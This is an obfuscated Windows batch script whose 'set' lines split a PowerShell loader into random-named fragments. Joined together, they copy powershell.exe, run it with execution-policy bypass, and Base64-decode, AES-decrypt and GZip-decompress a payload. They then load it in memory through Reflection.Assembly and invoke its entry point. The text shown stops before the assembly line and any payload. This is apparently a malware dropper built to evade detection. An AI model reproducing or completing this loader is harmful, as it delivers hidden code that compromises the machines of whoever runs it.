@echo off
set "dKBZWgOdzu=Po"
set "NlGSqYsFIU=\W"
set "wwMVziaKwA=rS"
set "kSjaADqemC=Sy"
set "qzwysjRcjd=ll"
set "LrAnCvpkUU=em"
set "ulYqbHboPl=we"
set "lTyBNVWAiH=xe"
set "SJJuDbjVtp=Wi"
set "ywRLhGYFzO=\v"
set "iKZUbEEkuW=he"
set "GKckxiCoWy=he"
set "cQUTVWZnDp=0\"
set "YsVhaTrVye=in"
set "SXrTRdgodJ=ll"
set "EqxVTeqSvf=ow"
set "vQskLzKHWD=ws"
set "FJvrhWFHFe=:\"
set "zKlznMgwvp=32"
set "BnVgfeLhSV=y "
set "eCZVrCkPqt=.e"
set "NLkDcrvrnp=py"
set "KDAPPawTUY= /"
set "MOLiwkgwGL=s\"
set "qYBsbMSnMu=po"
set "gdHYlKldox=1."
set "PNvgzBmNAy=st"
set "XNNLbHBYPk=rs"
set "GZKGQmSxnH=we"
set "vXbZTsTNFy=co"
set "UPQjNuNCpK= C"
set "ogkrdeCVSN=do"
set "jbsrfFgRly=nd"
set "DWAWPxjRFJ= %~dp0"
set "XSLaWdHpRz=cd"
set "HzYUmpoIkX=xpSq"
set "gjyPdlYOro=yvG "
set "CuSzQXlYOK=gnir"
set "SlasWnwizC=]::N"
set "GgMIlrLEpY=; };"
set "pGTZkauXES=bstr"
set "wXzzqrlqIm=[Env"
set "FcfwEoITcE=]::("
set "ommfajfEpi=-Obj"
set "ODYJoLliqT=y.Pa"
set "drIqeDQydP=zG ="
set "hMDXYZTBIt=Bmor"
set "bOJOozqlZx=stem"
set "zLvidTcFav=ode]"
set "lSinYqPKzj=S46e"
set "FTXKxLLqtb=::('"
set "rZgfFDYtev=k; }"
set "hxjmfEVEie=ion."
set "YojxJHXdvG=mory"
set "ciutnesOwR=yste"
set "tmxmIGwvhn=.Dis"
set "vmZgWrJUJW=CgV."
set "hnLMOciyto=);$L"
set "QptoxousFM=raph"
set "JueqlkgrON=Syst"
set "OWbProDDsS=ring"
set "JwMRxZsktG=6esa"
set "TYfNbuFCYY=G.En"
set "GxHQhwpIJe=BC;$"
set "MfoULtLgDz= = $"
set "iKTrQYccZI=oArr"
set "PMBWrZiNJM=);$r"
set "uJxkXiTgoK=comm"
set "SoOxvpsMFZ=.Key"
set "GZqXsTQZVy==');"
set "JOrRncElSq=yste"
set "UOEStZwQgp=rtS4"
set "vcFnsCTMzn=7;$r"
set "lBBHGrflmw=IoO3"
set "zLxUoDbzcm=.-16"
set "fHqpsIFIBC=Secu"
set "eJGvHkuYAe=ateD"
set "HsKmUsEpqB=New-"
set "zkojfVoeEb=ew-O"
set "vwLcfsSULF=);$T"
set "HnIgFoHpLF=Obje"
set "abXpsLqRoo=ect "
set "qBsKKnJnFF=eJAA"
set "IhaCJLTPzS=eJAA"
set "XtbJlkErri=tem."
set "JmpuekSLhv=ress"
set "mtVYQCLBVl=a, 0"
set "QDJpZDxClS=Sq.D"
set "JaXUMdKBnH=lBlo"
set "YDwPUmmeGm=.Cop"
set "wSzhFBTAyz=.Mem"
set "VRfimDLUhp=$TGG"
set "CIwHoSfQDY=form"
set "ltXeLjmTME=eJAA"
set "cxQWzNwYyW=pres"
set "UjaiZwpGEs=n ''"
set "DMFcSFRPJf=La ="
set "iWQBkunvbq='[-1"
set "OiiEvzLGGY=FGa."
set "MqPpiskJPr=($cN"
set "bhaSApCcXg=La);"
set "EmObesRRHs=-1.."
set "HFJUghZJup=am;$"
set "YvJBMeMaQK=Stre"
set "jxjkbOlePY=and "
set "EGJvhWVUWZ=[]] "
set "HAbtBrJkIp='gni"
set "YMbZquhUPS=File"
set "gEseHfJRno=iron"
set "OxtMoxjxml=rt]:"
set "zxLwgRRJyE=.Cry"
set "ORhaRutCrA=embl"
set "JoxJLHcMGR=;$Nm"
set "ZHvXRmfMON=n ''"
set "jeNsJucAdm=$YbQ"
set "nEzFYadgSE='txe"
set "yARuqXuvRg=nage"
set "GegGkUhOiV=::De"
set "crxBZABXOX=R5jf"
set "kmrLJIVTiA=y.Ci"
set "YAyTEAqIfs=bQLa"
set "nryJIiAkRl=Invo"
set "UUzhoqDJWF=[Sys"
set "JBrLlMZTJe=ach "
set "BldJkFWqQB=brea"
set "EXzuVypBVK=yx.T"
set "ZIWKjicfqu=e = "
set "hdEPRohVWB=[Sys"
set "YFqirZCNFX=bQLa"
set "oLpVDGQbGX= = N"
set "uWfWwCnEAY=nirt"
set "wgrmURojmL=m(, "
set "MNBXRGbWdq=ct S"
set "ZyPeVdXkMh=  $F"
set "tfagAENbxM=FcNh"
set "tnXrojroGV=lit("
set "wqPonpfyLE= New"
set "LhCPurORiG=CgV "
set "qWJAtDoKsD=Conv"
set "VZdRAcBVyA= = $"
set "eLYCjTvutY=eJAA"
set "kFWnZqSKTV=[-1."
set "FsCDqgXqvM=aDNK"
set "cRAbkLYRKS=dV1k"
set "mWiDfvjEdu=$NmY"
set "rtwfVAITxo=RJVw"
set "ikwrDTcdfm=.Sec"
set "kEWkvntRpm=rity"
set "AAFcjkHgCN== $r"
set "RHyHGRPSgy=.IO."
set "ogPpdVtZOC=sion"
set "dGUUFHAGle=tryP"
set "ouypgIIqMo=New-"
set "HDTwfSDZJW=se()"
set "MOAXyKSbub=);$F"
set "TXuKRunBTI=grap"
set "bKNuPhMSoR=LxpS"
set "VeTXHjDPNz=PKCS"
set "LZQtYGxRCH=Secu"
set "xcdAvHkHyS=join"
set "DVpVgnKmjg=Disp"
set "cjmHpyjPyz=rans"
set "ehOMsNKOSj=urit"
set "AtScaXQhqk=ress"
set "XQVGUkipoB=saBm"
set "KaYidBuaCN=$TGG"
set "XvfUDbvXQK=$TGG"
set "EVrOSTAKPF=.Con"
set "CcLmVAdvDj=ing("
set "zVVkLFrBFW=vert"
set "rcoOEnAahk=Wp.T"
set "ZThNerwyqk=pose"
set "oilqpmBDsV=.GZi"
set "WVtmlzrmIG=$zGB"
set "UqQjDmtWNO=yx ="
set "PeSgkHabgO=$Lxp"
set "LkxNXgUzil=comp"
set "REDhvlMOgS=]::("
set "vVpXzIeKiu=em.I"
set "qackoEUvkp=..-1"
set "hOGFOusAWB=O.Me"
set "FpKDuSyiNq=.Len"
set "ETnGLPGkRf=8kuY"
set "tuImQrBJmU=bjec"
set "KjUyklBWxN=g = "
set "SXrrbZPelp=morF"
set "RpnVEUdfLl=ispo"
set "EiUoiiZNrI=oL'["
set "gGBmGNXKNH=Ntyv"
set "xereUYWsCf=;$Nt"
set "PotIufQPlh=YbQL"
set "cHTCBPUSKi=ewLi"
set "pPLsBUxlxq=[IO."
set "ZLxVVPcIqh=oint"
set "bWJOyLhEgB=th('"
set "lQqaBLWKXh=cNCg"
set "tHEbnYXnKp=ert]"
set "wDUWVFwJNk=sFGa"
set "eeWfWLGdrK=-joi"
set "mZiRrBcrgh=('ev"
set "WwNyEwLuAl=a = "
set "kxQMXfELot=ecry"
set "wacraOAJaz=Comp"
set "noJaYBIcjF=bypa"
set "LZaJoREsAj=;$Nm"
set "dEDhQKcQIr=d;$r"
set "DPvITXQvBy=-ep "
set "rwvhSOCbcs=daeR"
set "DbiJmoNJxT=TllA"
set "lTKrzXiqfQ=in $"
set "nhQmlEdHYi=tem."
set "JdHILtqpFl=('da"
set "GqbOrqZcbp=$YbQ"
set "CwBMjxsiWh=m.IO"
set "IMVfqOZASq=;$Fs"
set "ulKmjaHzjO=gMod"
set "nbZAjuzuyT= [Sy"
set "CyHmsMZAPx=)($Y"
set "YmWhSeCZrl=6] -"
set "rnpEKgRnii=$reJ"
set "bGwusfeVVH=GGyx"
set "QdyiamTyNk=ss -"
set "VGoiKukJVO=Syst"
set "iJxjpPxvRK=YbQL"
set "brIgCqukSn= '')"
set "ZGZlSyYCHe=Star"
set "rxwtcgDpID='')("
set "VzAWjHEvAt=.Mod"
set "jaYRlovXdm=:('g"
set "iwQRrtdNQm=hy.A"
set "gSIaLupjWx=ypto"
set "xRMKtIeXaH= = ["
set "TwvYGjDTqv=AA.I"
set "WgTpbcaKOw=F'[-"
set "TjrAmQjaXi=.Ass"
set "VDBrUaSDDw=Mode"
set "zzbrCECpFJ=ne);"
set "EYVpJludVP=3); "
set "ltgDSIGGzL=ck($"
set "AJUzHXZPEu== [S"
set "FLAArVazXV=t Sy"
set "nPIHYRWrne= [st"
set "uGgdtlfvIE=tem."
set "jnDbwhZbrM=7kGw"
set "gpfDiPngQY=ionM"
set "foKYKAQWCp=csD."
set "evhhpBrQqY=ptog"
set "PVHRilNkWB=1..-"
set "YoOhHZSKJp=rofi"
set "PrqMTFcJBF=A.Pa"
set "HAEyNjaefO=a = "
set "KKlskCgEEp=e]::"
set "eglOyHwBxZ=rity"
set "ePtnrMGLmn=.Com"
set "coomufFEnw=pStr"
set "IHYKQBwhhC=ay()"
set "sWlQqrLPER=ke($"
set "mvKWcHLaRJ=reJA"
set "IHDMWhqJVW=CuSj"
set "UOgIArgwQY=y.Cr"
set "fUiNtDDxPu=-joi"
set "HlSAuSevyG=]::C"
set "jUDZLcBcSC=($cN"
set "YsuNYrTIGD=oin "
set "QVjWyOwOVT=pher"
set "LrbgkpfawQ=THxh"
set "dzRhhwpbtW=eJAA"
set "uXqYgjIkgg=] -j"
set "tedvNPamxr=D = "
set "sULYZGqhyt=ct S"
set "szFhTJkFQY=raph"
set "bKzUByiiHE=m.Re"
set "yBPaCPOvfS=YWp "
set "qhpwjyQSBp=trea"
set "FIFAXRVCSc=zGBz"
set "YOolJCNBwA=();$"
set "hZnmOsmpnA=-nop"
set "cTrslpOavn=tS46"
set "tSvkUGizyH=ment"
set "RbkXgRrxpM=orF'"
set "ZXWXFRUZBU=YWp."
set "DHMDBYSsNr=ddin"
set "UArASTWrRD=y]::"
set "sCptgjYzty=YbQL"
set "mJFgtwoRhT=)($F"
set "mxtWCuqEnA=Comp"
set "VmMQQEmQUz=Fina"
set "atKaTYaekv=eam("
set "KbqonxVLjx=ddin"
set "HquBCsdUjV=);$r"
set "FJFZVKBpSP=V.Su"
set "mqHcCwZYcH=esaB"
set "kCnnInWPHA=kyhK"
set "OahSYYGdKn=.Dis"
set "SbrSnrSaRN=ose("
